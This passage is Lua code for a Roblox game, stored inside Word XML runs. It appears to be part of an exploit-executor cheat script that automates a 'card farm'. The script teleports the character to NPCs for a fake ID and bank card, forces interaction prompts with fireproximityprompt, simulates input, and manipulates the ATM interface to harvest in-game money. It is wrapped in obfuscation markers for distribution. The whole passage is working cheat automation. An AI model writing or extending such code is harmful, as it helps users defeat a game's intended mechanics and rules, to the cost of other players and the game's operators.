        <w:t xml:space="preserve">                                        ATM = Value</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        break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    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                until ATM ~= nil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task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local Teleport_Status = Teleport(ATMPositions[tostring(ATM)])</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            repeat RunService.RenderStepped:Wait() until Teleport_Status == "Success"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack:FindFirstChild("Card"))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            --PressKey(Enum.KeyCode.LeftShift, .25) task.wait(.25)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            PressKey(Enum.KeyCode.W, .25) task.wait(.25)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            PressKey(Enum.KeyCode.S, .25) task.wait(.25)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            PressKey(Enum.KeyCode.A, .25) task.wait(.25)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            PressKey(Enum.KeyCode.D, .25) task.wait(.25)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(1.25)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            LocalPlayer.Character.Humanoid:MoveTo(ATM.CFrame.Position)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(2.5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            --PressKey(Enum.KeyCode.LeftShift, .25) task.wait(.25)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            PressKey(Enum.KeyCode.W, .25) task.wait(.25)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            PressKey(Enum.KeyCode.S, .25) task.wait(.25)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            PressKey(Enum.KeyCode.A, .25) task.wait(.25)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            PressKey(Enum.KeyCode.D, .25) task.wait(.25)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(1.25)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            fireproximityprompt(ATM.Attachment.ProximityPrompt)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            LocalPlayer.Character.Humanoid:MoveTo(ATM.CFrame.Position)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if ATM.ATMScreen.Transparency == 1 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                continue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repeat RunService.RenderStepped:Wait() until LocalPlayer.PlayerGui:FindFirstChild("ATM")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Services.VirtualUser:CaptureController()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            LocalPlayer.PlayerGui.ATM.Frame.Swipe.Position = UDim2.new(-3.0742092, 0, -0.270338974, 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(0.5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            LocalPlayer.PlayerGui.ATM.Frame.Swipe.Size = UDim2.new(1001 + Random.new():NextNumber(0.1, 1), 0, 1001 + Random.new():NextNumber(0.1, 1), 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(0.5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            repeat RunService.RenderStepped:Wait() </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if LocalPlayer.PlayerGui:FindFirstChild("ATM") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Services.VirtualUser:CaptureController() ; </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Services.VirtualUser:ClickButton1(Vector2.new(LocalPlayer.PlayerGui.ATM.Frame.Swipe.AbsolutePosition)) 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until not LocalPlayer.PlayerGui:FindFirstChild("ATM")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(3)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if playerHasCard == false then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if not LocalPlayer.Backpack:FindFirstChild("Fake ID") and not LocalPlayer.Character:FindFirstChild("Fake ID") and not LocalPlayer.Backpack:FindFirstChild("Card") and not LocalPlayer.Character:FindFirstChild("Card") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    local DistanceFromFakeIDSeller = GetDistance(LocalPlayer.Character.HumanoidRootPart.Position, Vector3.new(219.42543029785156, 3.7371325492858887, -332.2640686035156))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    local Tween = Services.TweenService:Create(LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(GetTweenSpeed(DistanceFromFakeIDSeller), Enum.EasingStyle.Linear), {CFrame = CFrame.new(219.42543029785156, 3.7371325492858887, -332.2640686035156)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    PressKeyTween(Enum.KeyCode.W, Tween) ; PressKeyTween(Enum.KeyCode.LeftShift, Tween)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Tween:Play() ; Tween.Completed:Wait() ; Tween = nil</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    repeat RunService.RenderStepped:Wait() fireproximityprompt(Workspace.NPCs.FakeIDSeller.UpperTorso.Attachment:FindFirstChild("ProximityPrompt")) until LocalPlayer.Backpack:FindFirstChild("Fake ID") or LocalPlayer.Character:FindFirstChild("Fake ID")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    repeat RunService.RenderStepped:Wait() if LocalPlayer.Backpack:FindFirstChild("Fake ID") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack:FindFirstChild("Fake ID"))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    until LocalPlayer.Character:FindFirstChild("Fake ID")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if not LocalPlayer.Backpack:FindFirstChild("Card") and not LocalPlayer.Character:FindFirstChild("Card") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    local DistanceFromFakeBankClerk = GetDistance(LocalPlayer.Character.HumanoidRootPart.Position, Vector3.new(-49.03115463256836, 3.7371387481689453, -323.28619384765625))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    local Tween = Services.TweenService:Create(LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(GetTweenSpeed(DistanceFromFakeBankClerk), Enum.EasingStyle.Linear), {CFrame = CFrame.new(-49.03115463256836, 3.7371387481689453, -323.28619384765625)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    PressKeyTween(Enum.KeyCode.W, Tween) ; PressKeyTween(Enum.KeyCode.LeftShift, Tween)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Tween:Play() ; Tween.Completed:Wait() ; Tween = nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    LocalPlayer.Character.Humanoid:MoveTo(Vector3.new(-49, 4, -321))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    task.wait(2.1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    local Application_Successful = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    local Old ; Old = LocalPlayer.PlayerGui.Main.Message.Warning:GetPropertyChangedSignal("Text"):Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        if not LocalPlayer.PlayerGui.Main.Message.Warning.Text:find("application") then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        if LocalPlayer.PlayerGui.Main.Message.Warning.Text == "Your application was successful. Please allow 30 seconds for the bank to prepare your card." then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            Application_Successful = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            playerHasCard = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            Application_Successful = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            playerHasCard = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    repeat RunService.RenderStepped:Wait() if LocalPlayer.Backpack:FindFirstChild("Fake ID") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack:FindFirstChild("Fake ID"))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    until LocalPlayer.Character:FindFirstChild("Fake ID")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    repeat RunService.RenderStepped:Wait() until Workspace.NPCs:FindFirstChild("Bank Teller")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    repeat fireproximityprompt(Workspace.NPCs:FindFirstChild("Bank Teller").UpperTorso.Attachment:FindFirstChild("ProximityPrompt")) task.wait() until not LocalPlayer.Character:FindFirstChild("Fake ID")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    LocalPlayer.PlayerGui.Main.Message.Warning:GetPropertyChangedSignal("Text"):Wait()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    task.spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        task.wait(3)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        Old:Disconnect()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    task.wait(.5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    if Application_Successful == false then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        continue</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    task.wait(1.5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    LocalPlayer.Character.Humanoid:MoveTo(Vector3.new(-43, 4, -332))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    task.wait(1.5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    repeat RunService.RenderStepped:Wait() fireproximityprompt(Workspace.Blank.Attachment.ProximityPrompt) until LocalPlayer.Backpack:FindFirstChild("Card")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    playerHasCard = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                local DistanceFromFakeBankClerk = GetDistance(LocalPlayer.Character.HumanoidRootPart.Position, Vector3.new(-49.03115463256836, 3.7371387481689453, -323.28619384765625))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                local Tween = Services.TweenService:Create(LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(GetTweenSpeed(DistanceFromFakeBankClerk), Enum.EasingStyle.Linear), {CFrame = CFrame.new(-49.03115463256836, 3.7371387481689453, -323.28619384765625)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                PressKeyTween(Enum.KeyCode.W, Tween) ; PressKeyTween(Enum.KeyCode.LeftShift, Tween)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Tween:Play() ; Tween.Completed:Wait() ; Tween = nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                LocalPlayer.Character.Humanoid:MoveTo(Vector3.new(-49, 4, -321))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                task.wait(2.1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                LocalPlayer.Character.Humanoid:MoveTo(Vector3.new(-43, 4, -332))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                task.wait(1.5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                repeat RunService.RenderStepped:Wait() fireproximityprompt(Workspace.Blank.Attachment.ProximityPrompt) until LocalPlayer.Backpack:FindFirstChild("Card")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                playerHasCard = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if not LocalPlayer.Backpack:FindFirstChild("Card") and not LocalPlayer.Character:FindFirstChild("Card") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                continue</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(3)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local ATM;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local function GetClosestATM()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                local ATMClosestTable = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                for Index, Value in Workspace.Map.ATMS:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    if Value.ATMScreen.Transparency == 0 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                       table.insert(ATMClosestTable, {ATM = Value, Range = (LocalPlayer.Character.HumanoidRootPart.Position - Value.Position).Magnitude})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/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                table.sort(ATMClosestTable, function(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    return select(1, ...).Range &lt; select(2, ...).Range</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                return ATMClosestTable[1] ~= nil and ATMClosestTable[1].ATM or nil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repeat RunService.RenderStepped:Wait() until GetClosestATM() ~= nil</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            ATM = GetClosestATM()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local DistanceFromATM = GetDistance(LocalPlayer.Character.HumanoidRootPart.Position, ATMPositions[tostring(ATM)].Position)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local Tween = Services.TweenService:Create(LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(GetTweenSpeed(DistanceFromATM), Enum.EasingStyle.Linear), {CFrame = ATMPositions[tostring(ATM)]})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            PressKeyTween(Enum.KeyCode.W, Tween) ; PressKeyTween(Enum.KeyCode.LeftShift, Tween)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Tween:Play() ; Tween.Completed:Wait() ; Tween = nil</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            LocalPlayer.Character.Humanoid:MoveTo(ATM.CFrame.Position)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            fireproximityprompt(ATM.Attachment.ProximityPrompt)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if ATM.ATMScreen.Transparency == 1 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                continue</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if LocalPlayer.Backpack:FindFirstChild("Card") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack:FindFirstChild("Card"))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                task.wait(1)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repeat RunService.RenderStepped:Wait() until LocalPlayer.PlayerGui:FindFirstChild("ATM")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Services.VirtualUser:CaptureController()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            LocalPlayer.PlayerGui.ATM.Frame.Swipe.Position = UDim2.new(-3.0742092, 0, -0.270338974, 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(0.5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            LocalPlayer.PlayerGui.ATM.Frame.Swipe.Size = UDim2.new(1001 + Random.new():NextNumber(0.1, 1), 0, 1001 + Random.new():NextNumber(0.1, 1), 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(0.5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            repeat RunService.RenderStepped:Wait() </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if LocalPlayer.PlayerGui:FindFirstChild("ATM") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Services.VirtualUser:CaptureController() ;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Services.VirtualUser:ClickButton1(Vector2.new(LocalPlayer.PlayerGui.ATM.Frame.Swipe.AbsolutePosition)) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            until not LocalPlayer.PlayerGui:FindFirstChild("ATM")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(3)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end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Stop_CardFarm = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not CardFarm_Thread then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if coroutine.status(CardFarm_Thread) == "suspended" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
